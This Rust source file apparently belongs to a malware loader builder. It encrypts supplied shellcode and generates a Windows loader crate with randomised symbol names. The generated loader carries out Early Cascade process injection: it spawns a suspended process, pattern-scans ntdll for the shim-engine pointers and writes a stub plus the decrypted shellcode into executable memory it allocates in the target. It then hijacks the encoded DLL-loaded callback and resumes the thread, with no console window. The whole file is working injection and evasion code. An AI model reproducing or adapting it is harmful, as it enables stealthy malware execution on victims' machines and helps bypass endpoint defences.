use std::path::PathBuf;

use crate::crypt::{self, AuxConst};
use crate::emit::{
    CrateMeta, EmitError, EmittedFile, FileBody, Item, LoaderProgram, Namebook, Section,
};
use crate::spec::{EncryptionKind, BuildSpec};

pub fn build(
    recipe: &BuildSpec,
    names: &Namebook,
    target_exe: &str,
) -> Result<LoaderProgram, EmitError> {
    let stub_bytes = read_stub_bytes()?;
    let raw = std::fs::read(&recipe.shellcode_path).map_err(EmitError::Io)?;
    let out = crypt::encrypt(recipe.encryption, &raw, recipe.seed.0);

    let mut files: Vec<EmittedFile> = Vec::new();
    files.push(EmittedFile {
        rel_path: PathBuf::from("src/embed/blob.bin"),
        body: FileBody::Bytes(out.blob.clone()),
    });
    files.push(EmittedFile {
        rel_path: PathBuf::from("src/embed/stub.bin"),
        body: FileBody::Bytes(stub_bytes),
    });

    files.push(EmittedFile {
        rel_path: PathBuf::from(format!("src/{}.rs", names.mod_scan)),
        body: FileBody::Source(emit_scan_source(names)),
    });
    files.push(EmittedFile {
        rel_path: PathBuf::from(format!("src/{}.rs", names.mod_blob)),
        body: FileBody::Source(emit_blob_source(names, &out.key, &out.aux)),
    });
    files.push(EmittedFile {
        rel_path: PathBuf::from("src/main.rs"),
        body: FileBody::Source(emit_main_source(recipe, names, target_exe)),
    });

    let mut features: Vec<&'static str> = vec![
        "Win32_Foundation",
        "Win32_Security",
        "Win32_System_Memory",
        "Win32_System_Threading",
        "Win32_System_Diagnostics_Debug",
        "Win32_System_LibraryLoader",
    ];
    for c in &recipe.checks {
        if matches!(c.id, crate::spec::CheckId::VecInt3)
            && !features.contains(&"Win32_System_Kernel")
        {
            features.push("Win32_System_Kernel");
        }
    }
    let mut extra_deps: Vec<String> = Vec::new();
    for d in crypt::extra_emit_deps(recipe.encryption) {
        extra_deps.push(d.to_string());
    }
    let meta = CrateMeta {
        crate_name: names.crate_name.clone(),
        is_cdylib: false,
        extra_deps,
        extra_features_windows_sys: features,
    };

    Ok(LoaderProgram {
        crate_meta: meta,
        files,
    })
}

fn read_stub_bytes() -> Result<Vec<u8>, EmitError> {
    let p = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("assets")
        .join("stubs")
        .join("earlycascade.bin");
    std::fs::read(&p).map_err(EmitError::Io)
}

fn emit_scan_source(n: &Namebook) -> Vec<Section> {
    let mut sections: Vec<Section> = Vec::new();
    sections.push(Section::InnerAttrs(vec![
        "#![allow(non_snake_case, non_upper_case_globals, dead_code)]".into(),
    ]));
    sections.push(Section::Uses(vec![
        "use windows_sys::Win32::System::Memory::RtlCompareMemory;".into(),
    ]));

    let body = format!(
        r#"const MAX_PATTERN_SIZE: usize = 0x20;

pub fn {fn_encode}(ptr: u64) -> u64 {{
    let cookie: u32 = unsafe {{ *(0x7FFE0330 as *const u32) }};
    ((ptr ^ cookie as u64).rotate_right((cookie & 0x3F) as u32)) as u64
}}

pub fn {fn_pat}(buf: &[u8], pat: &[u8]) -> Option<usize> {{
    if buf.len() < pat.len() {{
        return None;
    }}
    buf.windows(pat.len()).position(|window| unsafe {{
        RtlCompareMemory(window.as_ptr() as _, pat.as_ptr() as _, pat.len()) == pat.len()
    }})
}}

#[repr(C)]
struct Marker {{
    data: [u8; MAX_PATTERN_SIZE],
    size: u8,
    pc_off: u8,
}}

pub fn {fn_find_dll}(ntdll_base: u64) -> Option<(u64, u64)> {{
    let patterns = [Marker {{
        data: [
            0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F, 0x8B, 0xC2, 0x48, 0x8B, 0x3D, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        ],
        size: 12,
        pc_off: 4,
    }}];

    let dos = ntdll_base as *const u8;
    let e_lfanew = unsafe {{ *(dos.offset(0x3C) as *const i32) }} as isize;
    let nt = (ntdll_base as isize + e_lfanew) as *const u8;
    let num_sections = unsafe {{ *(nt.offset(6) as *const u16) }} as usize;
    let opt_size = unsafe {{ *(nt.offset(20) as *const u16) }} as isize;
    let sec_start = unsafe {{ nt.offset(24 + opt_size) }};

    let mut text_va = 0u64;
    let mut text_size = 0u64;
    let mut mrdata_va = 0u64;
    let mut mrdata_size = 0u64;

    for i in 0..num_sections {{
        let sec = unsafe {{ sec_start.offset((i * 40) as isize) }};
        let name_arr = unsafe {{ *(sec as *const [u8; 8]) }};
        if name_arr == *b".text\0\0\0" {{
            text_va = unsafe {{ *(sec.offset(12) as *const u32) }} as u64;
            text_size = unsafe {{ *(sec.offset(8) as *const u32) }} as u64;
        }}
        if name_arr == *b".mrdata\0" {{
            mrdata_va = unsafe {{ *(sec.offset(12) as *const u32) }} as u64;
            mrdata_size = unsafe {{ *(sec.offset(8) as *const u32) }} as u64;
        }}
    }}

    let text_start = ntdll_base + text_va;

    for pat in patterns {{
        let mut pos = text_start as usize;
        let mem = unsafe {{
            core::slice::from_raw_parts(text_start as *const u8, text_size as usize)
        }};
        while let Some(off) = {fn_pat}(
            &mem[(pos - text_start as usize)..],
            &pat.data[..pat.size as usize],
        ) {{
            pos = text_start as usize + (pos - text_start as usize) + off + pat.size as usize;
            if unsafe {{ *((pos as *const u8).offset(3)) }} != 0 {{
                continue;
            }}
            let rel = unsafe {{ *(pos as *const i32) }};
            let addr = (pos as u64)
                .wrapping_add(rel as u64)
                .wrapping_add(pat.pc_off as u64);
            if addr >= ntdll_base + mrdata_va && addr < ntdll_base + mrdata_va + mrdata_size {{
                return Some((addr, pos as u64 - pat.size as u64));
            }}
        }}
    }}
    None
}}

pub fn {fn_find_shim}(ntdll_base: u64, offset_addr: u64) -> Option<u64> {{
    let patterns = [
        Marker {{
            data: [
                0xc6, 0x05, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0,
            ],
            size: 2,
            pc_off: 5,
        }},
        Marker {{
            data: [
                0x44, 0x38, 0x25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0, 0,
            ],
            size: 3,
            pc_off: 4,
        }},
        Marker {{
            data: [
                0x44, 0x38, 0x2D, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0, 0,
            ],
            size: 3,
            pc_off: 4,
        }},
    ];

    let search_start = offset_addr.saturating_sub(0xFF);
    let search_end = offset_addr + 0xFF;
    let mem = unsafe {{
        core::slice::from_raw_parts(
            search_start as *const u8,
            (search_end - search_start) as usize,
        )
    }};

    let dos = ntdll_base as *const u8;
    let e_lfanew = unsafe {{ *(dos.offset(0x3C) as *const i32) }} as isize;
    let nt = (ntdll_base as isize + e_lfanew) as *const u8;
    let num_sections = unsafe {{ *(nt.offset(6) as *const u16) }} as usize;
    let opt_size = unsafe {{ *(nt.offset(20) as *const u16) }} as isize;
    let sec_start = unsafe {{ nt.offset(24 + opt_size) }};

    let mut data_va = 0u64;
    let mut data_size = 0u64;
    for i in 0..num_sections {{
        let sec = unsafe {{ sec_start.offset((i * 40) as isize) }};
        let name_arr = unsafe {{ *(sec as *const [u8; 8]) }};
        if name_arr == *b".data\0\0\0" {{
            data_va = unsafe {{ *(sec.offset(12) as *const u32) }} as u64;
            data_size = unsafe {{ *(sec.offset(8) as *const u32) }} as u64;
        }}
    }}

    for pat in patterns {{
        let mut cur = 0usize;
        while let Some(off) = {fn_pat}(&mem[cur..], &pat.data[..pat.size as usize]) {{
            cur += off + pat.size as usize;
            let ptr = search_start + cur as u64;
            if unsafe {{ *((ptr + 3) as *const u8) }} != 0 {{
                continue;
            }}
            let rel = unsafe {{ *(ptr as *const i32) }};
            let addr = ptr.wrapping_add(rel as u64).wrapping_add(pat.pc_off as u64);
            if addr >= ntdll_base + data_va && addr < ntdll_base + data_va + data_size {{
                return Some(addr);
            }}
        }}
    }}
    None
}}"#,
        fn_encode = n.fn_encode_ptr,
        fn_pat = n.fn_find_pat,
        fn_find_dll = n.fn_find_dll,
        fn_find_shim = n.fn_find_shim,
    );

    sections.push(Section::Items(vec![Item::Raw(body)]));
    sections
}

fn emit_blob_source(n: &Namebook, key: &[u8], aux: &[AuxConst]) -> Vec<Section> {
    let mut sections: Vec<Section> = Vec::new();
    sections.push(Section::InnerAttrs(vec![
        "#![allow(non_upper_case_globals, dead_code)]".into(),
    ]));
    let mut body = format!(
        "pub const STUB: &[u8] = include_bytes!(\"embed/stub.bin\");\npub const ENC_SHELL: &[u8] = include_bytes!(\"embed/blob.bin\");\npub const {key_name}: [u8; {klen}] = {klit};",
        key_name = n.const_key,
        klen = key.len(),
        klit = byte_array_literal(key),
    );
    for ax in aux {
        if ax.tag == 'r' {
            body.push_str(&format!(
                "\npub const {rname}: [u8; {rlen}] = {rlit};",
                rname = n.const_rpoint,
                rlen = ax.bytes.len(),
                rlit = byte_array_literal(&ax.bytes),
            ));
        }
    }
    sections.push(Section::Items(vec![Item::Raw(body)]));
    sections
}

fn emit_main_source(recipe: &BuildSpec, n: &Namebook, target_exe: &str) -> Vec<Section> {
    let mut sections: Vec<Section> = Vec::new();
    sections.push(Section::InnerAttrs(vec![
        "#![allow(non_snake_case, non_upper_case_globals, dead_code)]".into(),
        "#![windows_subsystem = \"windows\"]".into(),
    ]));
    sections.push(Section::Uses(vec![
        "use windows_sys::Win32::{Foundation::CloseHandle, System::{Diagnostics::Debug::WriteProcessMemory, LibraryLoader::GetModuleHandleA, Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx}, Threading::{CREATE_SUSPENDED, CreateProcessA, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA, TerminateProcess}}};".into(),
        "use windows_sys::core::s;".into(),
        format!("mod {};", n.mod_scan),
        format!("mod {};", n.mod_blob),
    ]));

    let dec_items = crate::crypt::loader_decoder_items(recipe.encryption, n);
    let mut items: Vec<Item> = dec_items;

    let escaped = target_exe.replace('\\', "\\\\").replace('"', "\\\"");
    let main_body = format!(
        r#"    unsafe {{
        let target: *const u8 = s!("{target}");
        let si = core::mem::zeroed::<STARTUPINFOA>();
        let mut pi = core::mem::zeroed::<PROCESS_INFORMATION>();
        let ok = CreateProcessA(
            core::ptr::null(),
            target as _,
            core::ptr::null(),
            core::ptr::null(),
            0,
            CREATE_SUSPENDED,
            core::ptr::null(),
            core::ptr::null(),
            &si,
            &mut pi,
        );
        if ok == 0 {{ return; }}

        let ntdll = GetModuleHandleA(s!("ntdll.dll")) as u64;
        let (se_dll_loaded, off_addr) = match {scan}::{fn_find_dll}(ntdll) {{
            Some(x) => x,
            None => {{ TerminateProcess(pi.hProcess, 1); return; }}
        }};
        let shims_enabled = match {scan}::{fn_find_shim}(ntdll, off_addr) {{
            Some(x) => x,
            None => {{ TerminateProcess(pi.hProcess, 1); return; }}
        }};

        let shell = {dec_call};
        let total = {blob}::STUB.len() + shell.len();

        let mem = VirtualAllocEx(
            pi.hProcess,
            core::ptr::null_mut(),
            total,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if mem.is_null() {{ TerminateProcess(pi.hProcess, 1); return; }}

        let stub_addr  = mem as u64;
        let shell_addr = stub_addr + {blob}::STUB.len() as u64;

        let placeholder = {scan}::{fn_pat}({blob}::STUB, &[0x11; 8]).unwrap_or(0);
        let mut patched = {blob}::STUB.to_vec();
        patched[placeholder..placeholder + 8].copy_from_slice(&shims_enabled.to_le_bytes());

        WriteProcessMemory(pi.hProcess, mem, patched.as_ptr() as _, patched.len(), core::ptr::null_mut());
        WriteProcessMemory(pi.hProcess, shell_addr as _, shell.as_ptr() as _, shell.len(), core::ptr::null_mut());

        let encoded = {scan}::{fn_encode}(stub_addr);
        WriteProcessMemory(pi.hProcess, se_dll_loaded as _, &encoded as *const _ as _, 8, core::ptr::null_mut());

        let one: u8 = 1;
        WriteProcessMemory(pi.hProcess, shims_enabled as _, &one as *const _ as _, 1, core::ptr::null_mut());

        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }}"#,
        target = escaped,
        scan = n.mod_scan,
        blob = n.mod_blob,
        fn_find_dll = n.fn_find_dll,
        fn_find_shim = n.fn_find_shim,
        fn_pat = n.fn_find_pat,
        fn_encode = n.fn_encode_ptr,
        dec_call = ec_decode_call(recipe.encryption, n),
    );

    items.push(Item::Fn {
        sig: "fn main()".into(),
        body: main_body,
    });

    sections.push(Section::Items(items));
    sections
}

fn ec_decode_call(kind: EncryptionKind, n: &Namebook) -> String {
    match kind {
        EncryptionKind::Ecies => format!(
            "{dec}({blob}::ENC_SHELL, &{blob}::{key}, &{blob}::{rpoint})",
            dec = n.fn_decode,
            blob = n.mod_blob,
            key = n.const_key,
            rpoint = n.const_rpoint,
        ),
        _ => format!(
            "{dec}({blob}::ENC_SHELL, &{blob}::{key})",
            dec = n.fn_decode,
            blob = n.mod_blob,
            key = n.const_key,
        ),
    }
}

fn byte_array_literal(bytes: &[u8]) -> String {
    let mut out = String::from("[");
    for (i, b) in bytes.iter().enumerate() {
        if i > 0 {
            out.push_str(", ");
        }
        out.push_str(&format!("0x{:02x}", b));
    }
    out.push(']');
    out
}
